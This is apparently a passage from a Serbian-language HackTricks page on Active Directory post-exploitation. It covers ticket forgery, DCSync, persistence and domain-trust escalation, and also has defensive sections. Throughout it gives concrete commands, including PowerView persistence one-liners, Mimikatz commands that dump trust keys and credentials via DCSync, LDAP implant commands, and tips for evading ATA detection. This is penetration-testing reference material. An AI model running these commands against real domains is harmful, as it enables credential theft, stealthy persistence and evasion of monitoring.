Ako su konfigurisani **vulnerable templates** moguće ih je abused-ovati za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Kada dobiješ **Domain Admin** ili još bolje **Enterprise Admin** privilegije, možeš da **dump**-uješ **domain database**: _ntds.dit_.

[**Više informacija o DCSync attack može se naći ovde**](dcsync.md).

[**Više informacija o tome kako da steal NTDS.dit može se naći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Neke od prethodno opisanih tehnika mogu da se koriste za persistence.\
Na primer, možeš:

- Napraviti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Napraviti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** kreira **legitimate Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC naloga**). Ovaj metod se koristi za **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da napadač dobije pristup **NTLM hash-u naloga krbtgt** u Active Directory (AD) okruženju. Ovaj nalog je poseban jer se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su neophodni za autentifikaciju unutar AD mreže.

Kada napadač dođe do ovog hasha, može da kreira **TGTs** za bilo koji nalog koji izabere (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su kao golden tickets, ali forge-ovani na način koji **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Imati certifikate naloga ili moći da ih zatražiš** je veoma dobar način da se zadržiš u korisničkom nalogu (čak i ako promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenje certifikata takođe omogućava persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

**AdminSDHolder** objekt u Active Directory obezbeđuje sigurnost **privileged groups** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na ove grupe kako bi sprečio neovlašćene izmene. Međutim, ova funkcija može da se abused-uje; ako napadač izmeni ACL AdminSDHolder-a tako da dodeli potpuni pristup običnom korisniku, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova bezbednosna mera, namenjena zaštiti, tako može da se obije o glavu i omogući neopravdan pristup ako se ne nadgleda pažljivo.

[**Više informacija o AdminDSHolder Group ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller (DC)** postoji nalog **local administrator**. Ako se dobiju admin prava na takvoj mašini, hash lokalnog Administrator-a može da se izdvoji pomoću **mimikatz**. Nakon toga je potrebna izmena registry-ja da bi se **enable the use of this password**, što omogućava remote access lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možeš da **give** nekim **special permissions** korisniku nad određenim domain objektima, što će omogućiti korisniku da **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste da **store** **permissions** koje neki **object** ima **over** drugim **object**-om. Ako možeš samo da **make** malu promenu u **security descriptor**-u nekog objekta, možeš dobiti veoma zanimljive privilegije nad tim objektom bez potrebe da budeš član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Iskoristi `dynamicObject` auxiliary class za kreiranje kratkovečnih principals/GPOs/DNS records sa `entryTTL`/`msDS-Entry-Time-To-Die`; sami se brišu bez tombstones, brišući LDAP tragove dok ostavljaju orphan SID-ove, pokvarene `gPLink` reference ili keširane DNS odgovore (npr. AdminSDHolder ACE pollution ili maliciozni `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmeni **LSASS** u memoriji da bi uspostavio **universal password**, dajući pristup svim domain nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možeš da napraviš sopstveni **SSP** da bi **capture**-ovao u **clear text** **credentials** korišćene za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registrovaće **new Domain Controller** u AD i koristi ga da **push attributes** (SIDHistory, SPNs...) na određene objekte **without** ostavljanja ikakvih **logs** u vezi sa **modifications**. **Treba ti DA** privilegija i moraš biti unutar **root domain**.\
Napomena da će se, ako koristiš pogrešne podatke, pojaviti prilično ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Prethodno smo govorili o tome kako da eskaliraš privilegije ako imaš **enough permission to read LAPS passwords**. Međutim, ove lozinke mogu da se koriste i za **maintain persistence**.\
Pogledaj:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft smatra **Forest** bezbednosnom granicom. To znači da **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji omogućava korisniku iz jednog **domain**-a da pristupi resursima u drugom **domain**-u. On suštinski stvara vezu između sistema autentifikacije ta dva domena, omogućavajući da provere autentifikacije teku neometano. Kada domeni uspostave trust, razmenjuju i čuvaju određene **keys** unutar svojih **Domain Controllers (DCs)**, koje su ključne za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain**, prvo mora da zatraži specijalni ticket poznat kao **inter-realm TGT** od svog DC-a. Ovaj TGT je enkriptovan zajedničkim **key**-em na kojem su se oba domena usaglasila. Korisnik zatim predstavlja ovaj TGT **DC of the trusted domain** da bi dobio service ticket (**TGS**). Nakon uspešne validacije inter-realm TGT-a od strane DC-a trusted domena, on izdaje TGS, dajući korisniku pristup servisu.

**Koraci**:

1. **client computer** u **Domain 1** pokreće proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim traži **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan **trust key**-jem deljenim između DC1 i DC2 kao deo dvosmernog domain trust-a.
5. Klijent nosi inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći svoj zajednički trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kojem klijent želi da pristupi.
7. Na kraju, klijent predstavlja ovaj TGS serveru, koji je enkriptovan hash-om naloga servera, da bi dobio pristup servisu u Domain 2.

### Different trusts

Važno je primetiti da **a trust can be 1 way or 2 ways**. U 2 ways opciji, oba domena će verovati jedan drugom, ali u **1 way** trust relaciji jedan od domena će biti **trusted** a drugi **trusting** domain. U poslednjem slučaju, **you will only be able to access resources inside the trusting domain from the trusted one**.

Ako Domain A veruje Domain B, A je trusting domain a B trusted. Štaviše, u **Domain A**, ovo bi bio **Outbound trust**; a u **Domain B**, ovo bi bio **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Ovo je uobičajena postavka unutar istog forest-a, gde child domain automatski ima dvosmerni transitive trust sa svojim parent domain-om. Suštinski, to znači da autentifikacioni zahtevi mogu neometano da teku između parent i child.
- **Cross-link Trusts**: Nazivaju se i "shortcut trusts", uspostavljaju se između child domena da bi se ubrzao referral proces. U kompleksnim forest-ovima, autentifikacioni referral-i obično moraju da putuju do forest root-a, pa zatim nadole do ciljnog domena. Kreiranjem cross-link-ova put je kraći, što je posebno korisno u geografski raspršenim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domeni izvan trenutnog forest-a koji nije povezan forest trust-om. Bezbednost se pojačava SID filtriranjem kod external trust-ova.
- **Tree-root Trusts**: Ovi trustovi se automatski uspostavljaju između forest root domena i novo dodatog tree root-a. Iako se ne sreću često, tree-root trustovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno domain ime i obezbeđujući dvosmernu transitive povezanost. Više informacija može se naći u [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ova vrsta trust-a je dvosmerni transitive trust između dva forest root domena, uz dodatno SID filtriranje radi povećanja bezbednosti.
- **MIT Trusts**: Ovi trustovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trustovi su nešto specijalizovaniji i namenjeni okruženjima koja zahtevaju integraciju sa Kerberos-based sistemima van Windows ekosistema.

#### Other differences in **trusting relationships**

- Trust relationship može biti i **transitive** (A trust B, B trust C, pa A trust C) ili **non-transitive**.
- Trust relationship može biti podešen kao **bidirectional trust** (oba veruju jedno drugom) ili kao **one-way trust** (samo jedan veruje drugom).

### Attack Path

1. **Enumerate** trusting relationships
2. Proveri da li neki **security principal** (user/group/computer) ima **access** resursima **other domain**, možda kroz ACE unose ili kroz članstvo u grupama drugog domena. Traži **relationships across domains** (trust je verovatno napravljen zbog ovoga).
1. kerberoast u ovom slučaju može biti druga opcija.
3. **Compromise** **accounts** koji mogu da **pivot**-uju kroz domene.

Napadači sa mogu pristupiti resursima u drugom domenu kroz tri glavna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, čime dobijaju značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ovog metoda zavisi od prirode trust-a i obima grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti navedeni u **ACL**, posebno kao entiteti u **ACEs** unutar **DACL**, dajući im pristup određenim resursima. Za one koji žele dublje da uđu u mehaniku ACL-ova, DACL-ova i ACE-ova, whitepaper pod nazivom “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Find external users/groups with permissions

Možeš proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da pronađeš foreign security principals u domenu. To će biti user/group iz **an external domain/forest**.

Ovo možeš proveriti u **Bloodhound** ili koristeći powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Eskalacija privilegija iz child u parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedna za _Child --> Parent_ i druga za _Parent_ --> _Child_.\
> Možete onu koju koristi trenutni domain saznati pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate kao Enterprise admin do child/parent domain abusovanjem trust-a uz SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može exploit-ovati je ključno. Configuration NC služi kao centralno spremište za configuration data kroz forest u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar forest-a, pri čemu writable DC-ovi održavaju writable kopiju Configuration NC-a. Da bi se ovo iskoristilo, potrebno je imati **SYSTEM privilegije na DC-u**, po mogućnosti child DC.

**Link GPO to root DC site**

Configuration NC's Sites container sadrži informacije o site-ovima svih računara pridruženih domeni unutar AD forest-a. Delovanjem sa SYSTEM privilegijama na bilo kom DC-u, napadači mogu link-ovati GPO-ove na root DC site-ove. Ova radnja potencijalno kompromituje root domain manipulisanjem policy-ima primenjenim na te site-ove.

Za detaljne informacije, može se istražiti research o [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan attack vector uključuje targetovanje privilegovanih gMSA-ova unutar domain-a. KDS Root key, neophodan za računanje gMSA-ovih passwords, čuva se unutar Configuration NC-a. Sa SYSTEM privilegijama na bilo kom DC-u, moguće je pristupiti KDS Root key-u i izračunati passwords za bilo koji gMSA širom forest-a.

Detaljna analiza i step-by-step guidance mogu se naći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusovanje migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ovaj method zahteva strpljenje, čekanje na kreiranje novih privilegovanih AD objects. Sa SYSTEM privilegijama, attacker može modifikovati AD Schema kako bi bilo kom user-u dodelio potpunu kontrolu nad svim classes. To može dovesti do neovlašćenog pristupa i kontrole nad novokreiranim AD objects.

Dalje čitanje je dostupno na [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability targetuje control nad Public Key Infrastructure (PKI) objects kako bi se kreirao certificate template koji omogućava authentication kao bilo koji user unutar forest-a. Pošto se PKI objects nalaze u Configuration NC, kompromitovanje writable child DC-a omogućava izvršavanje ESC5 attacks.

Više detalja o ovome može se pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima bez ADCS-a, attacker ima mogućnost da postavi neophodne komponente, kao što je objašnjeno u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domain je trusted** od strane eksternog, što vam daje **nedeterminisan permissions** nad njim. Moraćete da pronađete **koji principals vašeg domain-a imaju koji access nad eksternim domain-om** i zatim pokušate da to exploitujete:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **daje** neke **privilegije** principal-u iz **drugih domena**.

Međutim, kada je **domen trusted** od strane trusting domena, trusted domen **kreira korisnika** sa **predvidljivim imenom** koji koristi **trusted password** kao **lozinku**. To znači da je moguće **pristupiti korisniku iz trusting domena da biste ušli u trusted domen** kako biste ga enumerisali i pokušali da eskalirate još privilegija:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način da kompromitujete trusted domen je da pronađete [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiran u **suprotnom smeru** od domain trust-a (što nije baš uobičajeno).

Drugi način da kompromitujete trusted domen je da sačekate na mašini gde **korisnik iz trusted domena može da pristupi** i ulogujete se preko **RDP**. Tada bi attacker mogao da injektuje code u proces RDP sesije i **pristupi origin domenu žrtve** odatle.\
Štaviše, ako je **žrtva mountovala svoj hard drive**, iz **RDP sesije** proces attacker bi mogao da sačuva **backdoors** u **startup folder** hard diska. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe domain trust-a

### **SID Filtering:**

- Rizik od attacks koji koriste SID history atribut preko forest trust-a ublažava se SID Filtering-om, koji je podrazumevano aktiviran na svim inter-forest trust-ovima. Ovo se zasniva na pretpostavci da su intra-forest trust-ovi sigurni, pri čemu se forest, a ne domen, smatra bezbednosnom granicom u skladu sa Microsoft-ovim stavom.
- Međutim, postoji kvaka: SID filtering može da poremeti aplikacije i pristup korisnika, što dovodi do njegovog povremenog isključivanja.

### **Selective Authentication:**

- Za inter-forest trust-ove, korišćenje Selective Authentication obezbeđuje da se korisnici iz dva forest-a ne autentifikuju automatski. Umesto toga, potrebne su eksplicitne dozvole da bi korisnici pristupili domenima i serverima unutar trusting domena ili forest-a.
- Važno je napomenuti da ove mere ne štite od eksploatacije writable Configuration Naming Context (NC) ili attacks na trust account.

[**Više informacija o domain trust-ovima na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira bloodyAD-style LDAP primitive kao x64 Beacon Object Files koji rade potpuno unutar on-host implant-a (npr. Adaptix C2). Operateri kompajliraju pack sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim pozivaju `ldap <subcommand>` iz beacon-a. Sav traffic koristi trenutni logon security context preko LDAP (389) sa signing/sealing ili LDAPS (636) sa auto certificate trust, tako da nisu potrebni socks proxy-ji niti disk artefakti.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, i `get-groupmembers` rešavaju short names/OU paths u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute`, i `get-domaininfo` izvlače proizvoljne atribute (uključujući security descriptors) plus forest/domain metadata iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, i `get-rbcd` prikazuju roasting candidates, delegation settings, i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskriptore direktno iz LDAP-a.
- `get-acl` i `get-writable --detailed` parsiraju DACL da bi izlistali trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), i inheritance, dajući trenutne targete za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operateru da postavi nove principale ili machine accounts gde god postoje OU prava. `add-groupmember`, `set-password`, `add-attribute`, i `set-attribute` direktno preuzimaju targete kada se pronađu write-property prava.
- ACL-focused komande kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, i `add-dcsync` prevode WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinki, kontrolu članstva u grupama ili DCSync replication privilegije bez ostavljanja PowerShell/ADSI artefakata. `remove-*` odgovarajuće komande čiste injektovane ACE-ove.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` trenutno čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez diranja lozinke.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flags, ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacon-a, omogućavajući constrained/unconstrained/RBCD attack paths i eliminišući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injektuje privilegovane SID-ove u SID history kontrolisanog principala (vidi [SID-History Injection](sid-history-injection.md)), obezbeđujući stealthy inheritance pristup potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU za računare ili korisnike, omogućavajući napadaču da dovuče assete u OUs gde delegated rights već postoje pre nego što zloupotrebi `set-password`, `add-groupmember`, ili `add-spn`.
- Tightly scoped komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brzo vraćanje stanja nakon što operater prikupi credentialse ili persistence, minimizujući telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Saznajte više o tome kako da zaštitite credentials ovde.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins mogu da se prijave samo na Domain Controllers, kako bi se izbegla njihova upotreba na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi očuvanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. To se može postići pomoću: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 i zatim nametnite LDAP signing plus LDAPS channel binding na DCs/clients da biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ako želite da detektujete uobičajeni AD tradecraft, **ne oslanjajte se samo na artefakte pod kontrolom operatera** kao što su preimenovani binaries, service names, temp batch files, ili output paths. Postavite baseline za to kako legitimni Windows clients grade [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, i WMI traffic, a zatim tražite **implementation quirks** koje ostaju čak i nakon što operater izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ili `ntlmrelayx.py`.

- **High-confidence standalone candidates** (nakon validacije prema vašem sopstvenom baseline-u):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Bolje kao correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Nekoliko ovih osobina sa istog hosta/user/session/time window-a mnogo je jače od bilo kog pojedinačnog slabog polja
- **Koristite kao enrichment, ne kao standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, i tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Ove stvari operateri lako menjaju i najbolje ih je koristiti da objasne zašto je cross-protocol cluster sumnjiv
- **Operational notes**:
- Neki od ovih signala zahtevaju decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, ili service-side visibility
- Validirajte protiv Samba/Linux clients, appliances, i legacy software pre nego što ih promenite u alerts
- Promovišite detections od enrichment -> hunting -> alerting kako gradite poverenje u baseline

### **Implementing Deception Techniques**

- Implementing deception podrazumeva postavljanje zamki, kao što su decoy users ili computers, sa osobinama kao što su lozinke koje ne ističu ili su označene kao Trusted for Delegation. Detaljniji pristup uključuje kreiranje korisnika sa specifičnim pravima ili njihovo dodavanje u visokoprironitetne grupe.
- Praktičan primer uključuje korišćenje alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o postavljanju deception tehnika možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori uključuju atipičan ObjectSID, retke logone, datume kreiranja, i nizak broj bad password attempts.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa atributima stvarnih može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikovanju takvih decepcija.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje session enumeration na Domain Controllers da bi se sprečila ATA detekcija.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje ticket-ova pomaže da se izbegne detekcija time što se ne downgraduje na NTLM.
- **DCSync Attacks**: Preporučuje se izvršavanje sa ne-Domain Controller sistema kako bi se izbegla ATA detekcija, jer direktno izvršavanje sa Domain Controller-a pokreće alarme.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
